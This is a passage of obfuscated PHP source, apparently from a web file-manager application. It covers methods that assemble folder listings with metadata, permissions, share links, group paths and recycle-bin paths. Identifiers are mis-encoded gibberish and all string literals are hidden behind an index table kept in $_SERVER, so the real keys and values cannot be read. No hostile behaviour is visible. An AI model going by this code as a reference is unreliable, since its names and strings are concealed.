$ğÅ‘Êé¥[503]); $‡¿ÕØ±‡ = array($ğÅ‘Êé¥[32] => $ğÅ‘Êé¥[32], $ğÅ‘Êé¥[76] => $ğÅ‘Êé¥[76], $ğÅ‘Êé¥[175] => $ğÅ‘Êé¥[463], $ğÅ‘Êé¥[504] => $ğÅ‘Êé¥[504], $ğÅ‘Êé¥[505] => $ğÅ‘Êé¥[506], $ğÅ‘Êé¥[215] => $ğÅ‘Êé¥[215], $ğÅ‘Êé¥[85] => $ğÅ‘Êé¥[85]); $ƒäò¦¹í = Input::get($ğÅ‘Êé¥[507], $ğÅ‘Êé¥[7], $¥”ü¯ŸĞ, array_keys($‡¿ÕØ±‡)); $·ÏÎ£Û = Input::get($ğÅ‘Êé¥[508], $ğÅ‘Êé¥[7], $ˆÌ°ÅÎî, array_keys($ÀÚ¿š®)); if (!in_array($ƒäò¦¹í, array_keys($‡¿ÕØ±‡))) { $ƒäò¦¹í = $ğÅ‘Êé¥[32]; } if (!in_array($·ÏÎ£Û, array_keys($ÀÚ¿š®))) { $ƒäò¦¹í = $ğÅ‘Êé¥[500]; } if ($ƒäò¦¹í == $ğÅ‘Êé¥[32]) { } $å”øÌ‹ = $ğÅ‘Êé¥[509] . $‡¿ÕØ±‡[$ƒäò¦¹í] . $ğÅ‘Êé¥[53] . $ÀÚ¿š®[$·ÏÎ£Û]; $å”øÌ‹ = rtrim(trim($å”øÌ‹), $ğÅ‘Êé¥[50]); if ($ÉÊÕÕ¤Ğ) { return array($å”øÌ‹, $ÀÚ¿š®[$·ÏÎ£Û]); } return $this->order($å”øÌ‹); } protected function _listDataApplyItem($ÁÁÊßŞõ, $Öàšï¿· = false) { $Ğîæ£İÛ = array($ÁÁÊßŞõ); $this->_listDataApply($Ğîæ£İÛ, $Öàšï¿·); return $Ğîæ£İÛ[0]; } protected function _listDataApply(&$¯éÖ×óã, $á–Áê‚” = false) { $¾É§âÒì =& $_SERVER[íû‘ş´]; if (!$¯éÖ×óã) { $¯éÖ×óã = array(); return; } $ï¬Îœ÷Ø = array_to_keyvalue($¯éÖ×óã, $¾É§âÒì[12], $¾É§âÒì[181]); $ï¬Îœ÷Ø = array_unique($ï¬Îœ÷Ø); $this->_listSourceCache($¯éÖ×óã); if (!$á–Áê‚”) { $this->_listAppendMeta($¯éÖ×óã, $ï¬Îœ÷Ø); $this->_listAppendFileMeta($¯éÖ×óã, $ï¬Îœ÷Ø); $this->_listAppendChildren($¯éÖ×óã, $ï¬Îœ÷Ø); } $this->_listAppendPath($¯éÖ×óã); $this->_listAppendAuth($¯éÖ×óã); $this->_listAppendSourceInfo($¯éÖ×óã, $ï¬Îœ÷Ø); $this->_listAppendUser($¯éÖ×óã); $this->_listFilterInfo($¯éÖ×óã, $á–Áê‚”); $this->_listAppendAuthSecret($¯éÖ×óã); } protected function _listSourceCache($èÍÒ¬à) { $„‰™¢ğì =& $_SERVER[íû‘ş´]; foreach ($èÍÒ¬à as $Ä²ª›“ú) { self::$cacheSourceInfo[$„‰™¢ğì[510] . $Ä²ª›“ú[$„‰™¢ğì[181]]] = $Ä²ª›“ú; } } protected function _listFilterInfo(&$¦¾õ«î , $¤†˜Ò•ñ = false) { $¤Ü±˜À =& $_SERVER[íû‘ş´]; foreach ($¦¾õ«î  as &$¯íƒ§ŞŠ) { $¯íƒ§ŞŠ = $this->pathInfoFilter($¯íƒ§ŞŠ); self::$cachePathInfo[$¤Ü±˜À[511] . intval($¤†˜Ò•ñ) . $¤Ü±˜À[430] . $¯íƒ§ŞŠ[$¤Ü±˜À[181]]] = $¯íƒ§ŞŠ; } unset($¯íƒ§ŞŠ); } protected function _listMake(&$Á–™Èõ‘) { $øÍ§¨ºä =& $_SERVER[íû‘ş´]; $Á–™Èõ‘[$øÍ§¨ºä[82]] = array(); $Á–™Èõ‘[$øÍ§¨ºä[83]] = array(); foreach ($Á–™Èõ‘[$øÍ§¨ºä[413]] as $òÓÓØ‰¹) { $Èá›ÒÊº = $òÓÓØ‰¹[$øÍ§¨ºä[462]] == 1 ? $øÍ§¨ºä[82] : $øÍ§¨ºä[83]; $Á–™Èõ‘[$Èá›ÒÊº][] = $òÓÓØ‰¹; } unset($Á–™Èõ‘[$øÍ§¨ºä[413]]); } protected function _listAppendMeta(&$—¿ÚÑÕ, $®£ì¶ºÁ) { $¤–¹­’è =& $_SERVER[íû‘ş´]; $ŒÙÄ‰óÅ = array($¤–¹­’è[468] => array($¤–¹­’è[469], $®£ì¶ºÁ)); $ÌÎæÂÂğ = Model($¤–¹­’è[512])->field($¤–¹­’è[513])->where($ŒÙÄ‰óÅ)->select(); if (!$ÌÎæÂÂğ) { return; } $Í±«áìÎ = array($¤–¹­’è[514], $¤–¹­’è[515], $¤–¹­’è[494]); $Ï™Ø¬Ö = array(); foreach ($ÌÎæÂÂğ as $¶ÂÜÕ¬­) { if (!isset($Ï™Ø¬Ö[$¶ÂÜÕ¬­[$¤–¹­’è[181]]])) { $Ï™Ø¬Ö[$¶ÂÜÕ¬­[$¤–¹­’è[181]]] = array(); } if (in_array($¶ÂÜÕ¬­[$¤–¹­’è[94]], $Í±«áìÎ)) { continue; } $Ï™Ø¬Ö[$¶ÂÜÕ¬­[$¤–¹­’è[181]]][$¶ÂÜÕ¬­[$¤–¹­’è[94]]] = $¶ÂÜÕ¬­[$¤–¹­’è[418]]; } foreach ($—¿ÚÑÕ as &$öôªµœÚ) { $öôªµœÚ[$¤–¹­’è[516]] = !1; if (isset($Ï™Ø¬Ö[$öôªµœÚ[$¤–¹­’è[181]]])) { $öôªµœÚ[$¤–¹­’è[516]] = $Ï™Ø¬Ö[$öôªµœÚ[$¤–¹­’è[181]]]; } if ($this->fileIsLock($öôªµœÚ) && $öôªµœÚ[$¤–¹­’è[464]]) { $­©Õˆ€Ó = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $öôªµœÚ[$¤–¹­’è[464]][$¤–¹­’è[465]] = AuthModel::authDisable($öôªµœÚ[$¤–¹­’è[464]][$¤–¹­’è[465]], $­©Õˆ€Ó); $öôªµœÚ[$¤–¹­’è[464]][$¤–¹­’è[517]][$¤–¹­’è[464]] = $öôªµœÚ[$¤–¹­’è[464]][$¤–¹­’è[465]]; } } unset($öôªµœÚ); } protected function _listAppendFileMeta(&$´èÓ´Í‡, $²ÕÇ­Á) { $şÏº×İ =& $_SERVER[íû‘ş´]; $”“‘£«¥ = array_to_keyvalue($´èÓ´Í‡, $şÏº×İ[12], $şÏº×İ[518]); $”“‘£«¥ = array_filter(array_unique($”“‘£«¥)); if (!$”“‘£«¥) { return; } $˜ŞÔ€£ˆ = array($şÏº×İ[519] => array($şÏº×İ[469], $”“‘£«¥)); $ñ½¦ÌØï = $şÏº×İ[520]; $±ç–ƒå¡ = Model($şÏº×İ[521])->field($ñ½¦ÌØï)->where($˜ŞÔ€£ˆ)->select(); $±ç–ƒå¡ = array_to_keyvalue($±ç–ƒå¡, $şÏº×İ[518]); $£Ù•ĞÃ× = Model($şÏº×İ[522])->field($şÏº×İ[523])->where($˜ŞÔ€£ˆ)->select(); $£Ù•ĞÃ× = $£Ù•ĞÃ× ? $£Ù•ĞÃ× : array(); $†Œùì = array(); foreach ($£Ù•ĞÃ× as $¹’Æ±–à) { if (!isset($†Œùì[$¹’Æ±–à[$şÏº×İ[518]]])) { $†Œùì[$¹’Æ±–à[$şÏº×İ[518]]] = array(); } $†Œùì[$¹’Æ±–à[$şÏº×İ[518]]][$¹’Æ±–à[$şÏº×İ[94]]] = $¹’Æ±–à[$şÏº×İ[418]]; } foreach ($´èÓ´Í‡ as &$«š‚£İÕ) { $ö–óÚÛ = $«š‚£İÕ[$şÏº×İ[518]]; if (!$ö–óÚÛ || !is_array($±ç–ƒå¡[$ö–óÚÛ])) { continue; } $¥ÇŞÃ°ç = $±ç–ƒå¡[$ö–óÚÛ]; $¥ÇŞÃ°ç[$şÏº×İ[76]] = $«š‚£İÕ[$şÏº×İ[76]]; $¥ÇŞÃ°ç[$şÏº×İ[32]] = $«š‚£İÕ[$şÏº×İ[32]]; if (!$¥ÇŞÃ°ç[$şÏº×İ[524]]) { Model($şÏº×İ[521])->fileMd5Check($¥ÇŞÃ°ç); } if (!isset(self::$cacheFileInfo[$şÏº×İ[525] . $ö–óÚÛ])) { self::$cacheFileInfo[$şÏº×İ[525] . $ö–óÚÛ] = array_merge(array(), $¥ÇŞÃ°ç); } unset($±ç–ƒå¡[$ö–óÚÛ][$şÏº×İ[84]]); $ÏØ¶È¼· = is_array($†Œùì[$ö–óÚÛ]) ? $†Œùì[$ö–óÚÛ] : array(); $«š‚£İÕ[$şÏº×İ[526]] = array_merge($ÏØ¶È¼·, $±ç–ƒå¡[$ö–óÚÛ]); if (isset($«š‚£İÕ[$şÏº×İ[526]][$şÏº×İ[171]])) { $«š‚£İÕ[$şÏº×İ[171]] = json_decode($«š‚£İÕ[$şÏº×İ[526]][$şÏº×İ[171]], !0); unset($«š‚£İÕ[$şÏº×İ[526]][$şÏº×İ[171]]); } } unset($«š‚£İÕ); } protected function _listAppendSourceInfo(&$½²Â©, $İ‹Ñ¸–Ê) { $ŠûöÒ¥ =& $_SERVER[íû‘ş´]; $“ï”Ì€Ê = Model($ŠûöÒ¥[527])->listData(); $‡ÌáæÎ­ = Model($ŠûöÒ¥[476])->listData(); $•®æ·Ù = Model($ŠûöÒ¥[466])->listData(); $•‘ Ç» = Model($ŠûöÒ¥[528])->listSimple(); $¢–œ¢Èß = array_to_keyvalue($“ï”Ì€Ê, $ŠûöÒ¥[443]); $ªûˆèš = array_to_keyvalue_group($‡ÌáæÎ­, $ŠûöÒ¥[84], $ŠûöÒ¥[477]); $ëÛÑää÷ = array_to_keyvalue($•®æ·Ù, $ŠûöÒ¥[84]); $Ìö¡Ì¿€ = array_to_keyvalue_group($•‘ Ç», $ŠûöÒ¥[181]); foreach ($½²Â© as &$„ñ„ò) { $„ñ„ò[$ŠûöÒ¥[87]] = array($ŠûöÒ¥[529] => 0, $ŠûöÒ¥[530] => 0, $ŠûöÒ¥[531] => 0); if (isset($ëÛÑää÷[$„ñ„ò[$ŠûöÒ¥[181]]])) { $„ñ„ò[$ŠûöÒ¥[87]][$ŠûöÒ¥[532]] = 1; $„ñ„ò[$ŠûöÒ¥[87]][$ŠûöÒ¥[533]] = $ëÛÑää÷[$„ñ„ò[$ŠûöÒ¥[181]]][$ŠûöÒ¥[32]]; } if ($ªûˆèš && $¢–œ¢Èß && isset($ªûˆèš[$„ñ„ò[$ŠûöÒ¥[181]]])) { $„ñ„ò[$ŠûöÒ¥[87]][$ŠûöÒ¥[534]] = array(); foreach ($ªûˆèš[$„ñ„ò[$ŠûöÒ¥[181]]] as $Îü™‰İ¤) { $¦¬Ÿ»´Œ = $¢–œ¢Èß[$Îü™‰İ¤]; $„ñ„ò[$ŠûöÒ¥[87]][$ŠûöÒ¥[534]][] = array($ŠûöÒ¥[535] => $¦¬Ÿ»´Œ[$ŠûöÒ¥[443]], $ŠûöÒ¥[471] => $¦¬Ÿ»´Œ[$ŠûöÒ¥[32]], $ŠûöÒ¥[536] => $¦¬Ÿ»´Œ[$ŠûöÒ¥[537]]); } } if ($Ìö¡Ì¿€ && isset($Ìö¡Ì¿€[$„ñ„ò[$ŠûöÒ¥[181]]])) { $„ñ„ò[$ŠûöÒ¥[87]][$ŠûöÒ¥[538]] = array(); foreach ($Ìö¡Ì¿€[$„ñ„ò[$ŠûöÒ¥[181]]] as $Âü¨Ã©Å) { $• š…˜£ = $ŠûöÒ¥[539]; if ($Âü¨Ã©Å[$ŠûöÒ¥[540]] == $ŠûöÒ¥[88]) { $• š…˜£ .= $ŠûöÒ¥[541]; } $„ñ„ò[$ŠûöÒ¥[87]][$ŠûöÒ¥[538]] = array_field_key($Âü¨Ã©Å, explode($ŠûöÒ¥[50], $• š…˜£)); } } } unset($„ñ„ò); return $½²Â©; } protected function _listAppendChildren(&$Ÿ®æ¬¤º, $¾ùÔÅü) { $Ó´í°÷ã =& $_SERVER[íû‘ş´]; $Á«‡èËß = array(); $ª¨şìŒ¶ = array($Ó´í°÷ã[223] => 0, $Ó´í°÷ã[224] => 0); foreach ($Ÿ®æ¬¤º as &$´á£‘¿ñ) { if (!$´á£‘¿ñ[$Ó´í°÷ã[462]]) { continue; } $Á«‡èËß[] = $´á£‘¿ñ[$Ó´í°÷ã[181]]; } unset($´á£‘¿ñ); if (!$Á«‡èËß) { return; } $§­Öş£Ù = array($Ó´í°÷ã[180] => array($Ó´í°÷ã[7], $Á«‡èËß), $Ó´í°÷ã[482] => 0); $®ô´÷Ÿœ = array($Ó´í°÷ã[180], $Ó´í°÷ã[462], $Ó´í°÷ã[542] => $Ó´í°÷ã[543]); $ŠÓ­ = $this->field($®ô´÷Ÿœ)->where($§­Öş£Ù)->group($Ó´í°÷ã[544])->select(); $ñ±Ã­§Ê = array(); foreach ($ŠÓ­ as $©æÌ¥¨›) { $©Šõ¤› = $©æÌ¥¨›[$Ó´í°÷ã[180]]; $´Ê¹Æ×ò = $©æÌ¥¨›[$Ó´í°÷ã[462]] == $Ó´í°÷ã[88] ? $Ó´í°÷ã[224] : $Ó´í°÷ã[223]; if (!isset($ñ±Ã­§Ê[$©Šõ¤›])) { $ñ±Ã­§Ê[$©Šõ¤›] = array($Ó´í°÷ã[223] => 0, $Ó´í°÷ã[224] => 0); } $ñ±Ã­§Ê[$©Šõ¤›][$´Ê¹Æ×ò] += $©æÌ¥¨›[$Ó´í°÷ã[543]]; } foreach ($Ÿ®æ¬¤º as &$´á£‘¿ñ) { if (!$´á£‘¿ñ[$Ó´í°÷ã[462]]) { continue; } $ÂßŸÄ© = is_array($ñ±Ã­§Ê[$´á£‘¿ñ[$Ó´í°÷ã[181]]]) ? $ñ±Ã­§Ê[$´á£‘¿ñ[$Ó´í°÷ã[181]]] : $ª¨şìŒ¶; $´á£‘¿ñ[$Ó´í°÷ã[224]] = $ÂßŸÄ©[$Ó´í°÷ã[224]]; $´á£‘¿ñ[$Ó´í°÷ã[223]] = $ÂßŸÄ©[$Ó´í°÷ã[223]]; unset($´á£‘¿ñ[$Ó´í°÷ã[463]]); } unset($´á£‘¿ñ); } protected function _listAppendAuth(&$· Ÿìò¼) { $ª—é™€ƒ =& $_SERVER[íû‘ş´]; $…âÍ¯Òó = array(); foreach ($· Ÿìò¼ as $îÒé©ò†) { if ($îÒé©ò†[$ª—é™€ƒ[178]] == self::TYPE_GROUP) { $…âÍ¯Òó[] = $îÒé©ò†[$ª—é™€ƒ[181]]; } } if (!$…âÍ¯Òó) { return; } $„„Üœø“ = array_to_keyvalue($· Ÿìò¼, $ª—é™€ƒ[181]); $‘•Ï÷ÃÀ = Model($ª—é™€ƒ[545])->getSourceList($…âÍ¯Òó, $„„Üœø“); $½Û×æàç = $GLOBALS[$ª—é™€ƒ[546]] == 1; foreach ($· Ÿìò¼ as $©Íƒ®’ => &$îÒé©ò†) { $îÒé©ò†[$ª—é™€ƒ[464]] = $‘•Ï÷ÃÀ[$îÒé©ò†[$ª—é™€ƒ[181]]]; if (!$îÒé©ò†[$ª—é™€ƒ[464]] && $îÒé©ò†[$ª—é™€ƒ[178]] == self::TYPE_GROUP) { $îÒé©ò†[$ª—é™€ƒ[464]] = Action($ª—é™€ƒ[547])->pathGroupAuthMake($îÒé©ò†[$ª—é™€ƒ[548]]); if (!$îÒé©ò†[$ª—é™€ƒ[464]] && !$½Û×æàç) { $îÒé©ò†[$ª—é™€ƒ[217]] = !1; $îÒé©ò†[$ª—é™€ƒ[216]] = !1; } } if ($îÒé©ò†[$ª—é™€ƒ[464]]) { $îÒé©ò†[$ª—é™€ƒ[217]] = AuthModel::authCheckEdit($îÒé©ò†[$ª—é™€ƒ[464]][$ª—é™€ƒ[465]]); $îÒé©ò†[$ª—é™€ƒ[216]] = AuthModel::authCheckView($îÒé©ò†[$ª—é™€ƒ[464]][$ª—é™€ƒ[465]]); } $this->groupPathDisplay($îÒé©ò†); } unset($îÒé©ò†); } public function _listAppendAuthSecret(&$’ÍÜšÇ) { $Š¿ñğ =& $_SERVER[íû‘ş´]; if (Model($Š¿ñğ[485])->get($Š¿ñğ[549]) != $Š¿ñğ[88]) { return; } static $†×«á› = false; if (!$†×«á›) { $éÒÅò«Ô = Model($Š¿ñğ[550]); $ùÏşÔ²ù = Model($Š¿ñğ[551]); $†×«á› = $ùÏşÔ²ù->listData(); $†×«á› = array_to_keyvalue($†×«á›, $Š¿ñğ[181]); $”ä³ ¹ì = json_decode(Model($Š¿ñğ[485])->get($Š¿ñğ[552]), !0); $”ä³ ¹ì = array_to_keyvalue($”ä³ ¹ì, $Š¿ñğ[443]); foreach ($†×«á› as $»¸Ğ¨©Ğ => $Íéë´ìà) { $½âé½é± = $”ä³ ¹ì[$Íéë´ìà[$Š¿ñğ[553]]]; if (!$½âé½é±) { $ùÏşÔ²ù->remove($Íéë´ìà[$Š¿ñğ[443]]); unset($†×«á›[$»¸Ğ¨©Ğ]); continue; } $ˆç”®”” = $éÒÅò«Ô->listData($½âé½é±[$Š¿ñğ[464]]); if (!$ˆç”®””) { $ùÏşÔ²ù->remove($Íéë´ìà[$Š¿ñğ[443]]); unset($†×«á›[$»¸Ğ¨©Ğ]); continue; } $Íéë´ìà[$Š¿ñğ[464]] = $ˆç”®””; $Íéë´ìà[$Š¿ñğ[554]] = $½âé½é±; $Íéë´ìà[$Š¿ñğ[555]] = Model($Š¿ñğ[556])->getInfoSimpleOuter($Íéë´ìà[$Š¿ñğ[504]]); $†×«á›[$»¸Ğ¨©Ğ] = $Íéë´ìà; } } $…ì§íŞ = USER_ID; $¡²‡ÕÈß = array(); $’ôæ½ß² = $this->_listAppendPath($¡²‡ÕÈß, !0); foreach ($’ÍÜšÇ as $»¸Ğ¨©Ğ => &$Íéë´ìà) { if (!is_array($Íéë´ìà[$Š¿ñğ[464]])) { continue; } if ($Íéë´ìà[$Š¿ñğ[178]] != $Š¿ñğ[557]) { continue; } if (isset($†×«á›[$Íéë´ìà[$Š¿ñğ[181]]])) { $Ë¸¹Äî„ = $†×«á›[$Íéë´ìà[$Š¿ñğ[181]]]; if (!is_array($Íéë´ìà[$Š¿ñğ[516]])) { $Íéë´ìà[$Š¿ñğ[516]] = array(); } $Íéë´ìà[$Š¿ñğ[516]][$Š¿ñğ[558]] = $Ë¸¹Äî„[$Š¿ñğ[553]]; $Íéë´ìà[$Š¿ñğ[464]][$Š¿ñğ[559]] = $Ë¸¹Äî„; $Íéë´ìà[$Š¿ñğ[464]][$Š¿ñğ[560]] = $Íéë´ìà[$Š¿ñğ[561]]; $Íéë´ìà[$Š¿ñğ[464]][$Š¿ñğ[562]] = $Š¿ñğ[88]; if ($Ë¸¹Äî„[$Š¿ñğ[504]] != $…ì§íŞ) { $Íéë´ìà[$Š¿ñğ[464]][$Š¿ñğ[465]] = $Íéë´ìà[$Š¿ñğ[464]][$Š¿ñğ[465]] & $Ë¸¹Äî„[$Š¿ñğ[464]][$Š¿ñğ[464]]; } continue; } $É­åıüá = $this->parentLevelArray($Íéë´ìà[$Š¿ñğ[563]]); $±Œ¼ˆÊè = array_reverse($É­åıüá); foreach ($±Œ¼ˆÊè as $Åã®Ô±Ì => $¨Ü×¶¸ë) { if (!isset($†×«á›[$¨Ü×¶¸ë])) { continue; } $Ë¸¹Äî„ = $†×«á›[$¨Ü×¶¸ë]; $Íéë´ìà[$Š¿ñğ[464]][$Š¿ñğ[559]] = $Ë¸¹Äî„; if ($Ë¸¹Äî„[$Š¿ñğ[504]] != $…ì§íŞ) { $Íéë´ìà[$Š¿ñğ[464]][$Š¿ñğ[465]] = $Íéë´ìà[$Š¿ñğ[464]][$Š¿ñğ[465]] & $Ë¸¹Äî„[$Š¿ñğ[464]][$Š¿ñğ[464]]; } $Öã­‰Ğä = $Š¿ñğ[12]; $ß…µ¥³¸ = count($É­åıüá) - $Åã®Ô±Ì; for ($Ã­§•ˆ– = 0; $Ã­§•ˆ– < $ß…µ¥³¸; $Ã­§•ˆ–++) { if (!isset($’ôæ½ß²[$É­åıüá[$Ã­§•ˆ–]])) { $Öã­‰Ğä = $Š¿ñğ[12]; break; } $Öã­‰Ğä = $Öã­‰Ğä . rtrim($’ôæ½ß²[$É­åıüá[$Ã­§•ˆ–]], $Š¿ñğ[8]) . $Š¿ñğ[8]; } $Íéë´ìà[$Š¿ñğ[464]][$Š¿ñğ[560]] = rtrim($Öã­‰Ğä, $Š¿ñğ[8]) . $Š¿ñğ[8]; break; } } unset($Íéë´ìà); } public function groupPathDisplay(&$˜¾ü€Ÿ) { $üø”óÑı =& $_SERVER[íû‘ş´]; if ($˜¾ü€Ÿ[$üø”óÑı[178]] != self::TYPE_GROUP) { return; } $Æâ¦Èæï = Model($üø”óÑı[564])->getInfo($˜¾ü€Ÿ[$üø”óÑı[548]]); $åË•Êå¦ = $this->parentLevelArray($Æâ¦Èæï[$üø”óÑı[563]]); $îÄÍŸ = $üø”óÑı[12]; foreach ($åË•Êå¦ as $÷¹š«£Ç) { $¾àÜÓÂÓ = Model($üø”óÑı[564])->getInfo($÷¹š«£Ç); $îÄÍŸ .= $¾àÜÓÂÓ[$üø”óÑı[87]][$üø”óÑı[181]] . $üø”óÑı[50]; } $˜¾ü€Ÿ[$üø”óÑı[565]] = $Æâ¦Èæï[$üø”óÑı[180]]; $˜¾ü€Ÿ[$üø”óÑı[566]] = $Æâ¦Èæï[$üø”óÑı[563]]; $˜¾ü€Ÿ[$üø”óÑı[567]] = $Æâ¦Èæï[$üø”óÑı[568]]; $˜¾ü€Ÿ[$üø”óÑı[569]] = $îÄÍŸ . $Æâ¦Èæï[$üø”óÑı[87]][$üø”óÑı[181]]; } protected function _listAppendPath(&$ìƒæ€ÊÔ, $°¸ÇÓ = false) { $”½œüÆ =& $_SERVER[íû‘ş´]; static $ğÅÎ¦áë = array(); $‹â–¸Òª = array(); $ÁË‰Ç†é = array(); if ($°¸ÇÓ) { return $ğÅÎ¦áë; } foreach ($ìƒæ€ÊÔ as &$î´­ÌÅš) { $¼ú®¸é² = $î´­ÌÅš[$”½œüÆ[181]]; if ($î´­ÌÅš[$”½œüÆ[462]] == $”½œüÆ[88] && $î´­ÌÅš[$”½œüÆ[180]] != 0) { $ğÅÎ¦áë[$¼ú®¸é²] = $î´­ÌÅš[$”½œüÆ[32]]; } if ($î´­ÌÅš[$”½œüÆ[462]] == $”½œüÆ[88] && $î´­ÌÅš[$”½œüÆ[180]] == 0) { $ğÅÎ¦áë[$¼ú®¸é²] = $this->_listAppendPathRoot($î´­ÌÅš, array()); } if (isset($ÁË‰Ç†é[$î´­ÌÅš[$”½œüÆ[563]]])) { continue; } $ÁË‰Ç†é[$î´­ÌÅš[$”½œüÆ[563]]] = !0; $íÓİö¼Æ = $this->parentLevelArray($î´­ÌÅš[$”½œüÆ[563]]); foreach ($íÓİö¼Æ as $¡ıèÂ’ => $Àù†À×Æ) { if (isset($ğÅÎ¦áë[$Àù†À×Æ])) { continue; } if ($¡ıèÂ’ == 0) { $ğÅÎ¦áë[$Àù†À×Æ] = $this->_listAppendPathRoot($î´­ÌÅš, $íÓİö¼Æ); } if ($¡ıèÂ’ != 0) { $‹â–¸Òª[] = $Àù†À×Æ; } } } unset($î´­ÌÅš); $‹â–¸Òª = array_unique($‹â–¸Òª); if (count($‹â–¸Òª) > 0) { $öœÂíï = array($”½œüÆ[468] => array($”½œüÆ[469], $‹â–¸Òª)); if (count($‹â–¸Òª) == 1) { $¿Ñ×œß– = $this->sourceInfo($‹â–¸Òª[0]); $Œ‚¨ŸäŞ = is_array($¿Ñ×œß–) ? array($¿Ñ×œß–) : !1; } else { $Œ‚¨ŸäŞ = $this->field($”½œüÆ[570])->where($öœÂíï)->select(); } if (!$Œ‚¨ŸäŞ) { $Œ‚¨ŸäŞ = array(); } foreach ($Œ‚¨ŸäŞ as $úĞúÊïø) { $ğÅÎ¦áë[$úĞúÊïø[$”½œüÆ[181]]] = $úĞúÊïø[$”½œüÆ[32]]; } } $İÅû›ş† = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $õå§ÑÍ² = array(); foreach ($ìƒæ€ÊÔ as &$î´­ÌÅš) { $ÏŒêû»’ = $î´­ÌÅš[$”½œüÆ[563]]; $ÀŞÂŠ¬Ó = $”½œüÆ[12]; if (isset($õå§ÑÍ²[$ÏŒêû»’])) { $ÀŞÂŠ¬Ó = $õå§ÑÍ²[$ÏŒêû»’]; } else { $íÓİö¼Æ = $this->parentLevelArray($î´­ÌÅš[$”½œüÆ[563]]); foreach ($íÓİö¼Æ as $¡ıèÂ’ => $Àù†À×Æ) { if (isset($ğÅÎ¦áë[$Àù†À×Æ])) { $ÀŞÂŠ¬Ó .= $ğÅÎ¦áë[$Àù†À×Æ] . $”½œüÆ[8]; } } $õå§ÑÍ²[$ÏŒêû»’] = $ÀŞÂŠ¬Ó; } $ÀŞÂŠ¬Ó .= $î´­ÌÅš[$”½œüÆ[32]]; if ($î´­ÌÅš[$”½œüÆ[462]] == $”½œüÆ[88]) { $ÀŞÂŠ¬Ó .= $”½œüÆ[8]; } $î´­ÌÅš[$”½œüÆ[561]] = str_replace($”½œüÆ[571], $”½œüÆ[8], $ÀŞÂŠ¬Ó); if ($î´­ÌÅš[$”½œüÆ[180]] == $”½œüÆ[212]) { $î´­ÌÅš[$”½œüÆ[32]] = trim($ğÅÎ¦áë[$î´­ÌÅš[$”½œüÆ[181]]], $”½œüÆ[8]); $î´­ÌÅš[$”½œüÆ[561]] = $î´­ÌÅš[$”½œüÆ[32]] . $”½œüÆ[8]; } if (intval($î´­ÌÅš[$”½œüÆ[178]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($î´­ÌÅš, $íÓİö¼Æ, $İÅû›ş†); } } unset($î´­ÌÅš); return $ìƒæ€ÊÔ; } private function _listAppendPathRecycle(&$Ô±ìŒÑ, $ú †ËæÑ, $¯ãø ËÍ) { $…Ş‚ñ® =& $_SERVER[íû‘ş´]; if (!in_array($¯ãø ËÍ, $ú †ËæÑ) && $Ô±ìŒÑ[$…Ş‚ñ®[181]] != $¯ãø ËÍ) { return; } $ğ®§‘Ş¿ = explode($…Ş‚ñ®[8], trim($Ô±ìŒÑ[$…Ş‚ñ®[561]], $…Ş‚ñ®[8])); $Œ‚ƒåÙ = implode($…Ş‚ñ®[8], array_slice($ğ®§‘Ş¿, 2)); $Ô±ìŒÑ[$…Ş‚ñ®[561]] = $…Ş‚ñ®[8] . LNG($…Ş‚ñ®[572]) . $…Ş‚ñ®[8] . ltrim($Œ‚ƒåÙ, $…Ş‚ñ®[8]); $Ô±ìŒÑ[$…Ş‚ñ®[563]] = $…Ş‚ñ®[573] . implode($…Ş‚ñ®[50], array_slice($ú †ËæÑ, 1)) . $…Ş‚ñ®[50]; if ($Ô±ìŒÑ[$…Ş‚ñ®[181]] == $¯ãø ËÍ) { $Ô±ìŒÑ[$…Ş‚ñ®[563]] = $…Ş‚ñ®[573]; $Ô±ìŒÑ[$…Ş‚ñ®[180]] = $…Ş‚ñ®[212]; $Ô±ìŒÑ[$…Ş‚ñ®[32]] = LNG($…Ş‚ñ®[572]); } $Ô±ìŒÑ[$…Ş‚ñ®[574]] = $…Ş‚ñ®[575]; } protected function _listAppendPathRoot(&$’¦óßÊ÷, $èÚŒé¬) { $ÆİÊøÌº =& $_SERVER[íû‘ş´]; static $æ´ìƒìÏ = false; $ö÷ñûÅì = $ÆİÊøÌº[12]; if ($’¦óßÊ÷[$ÆİÊøÌº[178]] == self::TYPE_USER) { if ($’¦óßÊ÷[$ÆİÊøÌº[548]] == USER_ID) { $ö÷ñûÅì = LNG($ÆİÊøÌº[576]); if ($æ´ìƒìÏ === !1) { $¦ÙÂ’”® = Model($ÆİÊøÌº[577])->getInfoFull(USER_ID); $æ´ìƒìÏ = _get($¦ÙÂ’”®, $ÆİÊøÌº[578], $ÆİÊøÌº[12]); } if ($èÚŒé¬ && $èÚŒé¬[0] == $æ´ìƒìÏ || !$èÚŒé¬ && $’¦óßÊ÷[$ÆİÊøÌº[181]] == $æ´ìƒìÏ) { $ö÷ñûÅì = LNG($ÆİÊøÌº[579]); $’¦óßÊ÷[$ÆİÊøÌº[580]] = $ÆİÊøÌº[581]; } if (!$èÚŒé¬) { $’¦óßÊ÷[$ÆİÊøÌº[32]] = $ö÷ñûÅì; } } else { $’¦óßÊ÷[$ÆİÊøÌº[582]] = Model($ÆİÊøÌº[556])->getInfoSimpleOuter($’¦óßÊ÷[$ÆİÊøÌº[548]]); $ö÷ñûÅì = LNG($ÆİÊøÌº[583]) . $ÆİÊøÌº[163] . $’¦óßÊ÷[$ÆİÊøÌº[582]][$ÆİÊøÌº[32]] . $ÆİÊøÌº[165]; } } else { if ($’¦óßÊ÷[$ÆİÊøÌº[178]] == self::TYPE_GROUP) { $Ûæ­¨Áı = Model($ÆİÊøÌº[564])->getInfoSimple($’¦óßÊ÷[$ÆİÊøÌº[548]]); $ö÷ñûÅì = $Ûæ­¨Áı[$ÆİÊøÌº[32]]; } else { if ($’¦óßÊ÷[$ÆİÊøÌº[178]] == self::TYPE_SYSTEM) { $ö÷ñûÅì = $ÆİÊøÌº[584]; } } } $ö÷ñûÅì = $ö÷ñûÅì ? $ÆİÊøÌº[8] . $ö÷ñûÅì . $ÆİÊøÌº[8] : $ÆİÊøÌº[8]; return $ö÷ñûÅì; } protected function _listAppendUser(&$ñ‰àìâÓ) { $ÆŠØÌÍ =& $_SERVER[íû‘ş´]; $‹è‹˜·İ = array_to_keyvalue($ñ‰àìâÓ, $ÆŠØÌÍ[12], $ÆŠØÌÍ[504]); $©º¯îº = array_to_keyvalue($ñ‰àìâÓ, $ÆŠØÌÍ[12], $ÆŠØÌÍ[506]); 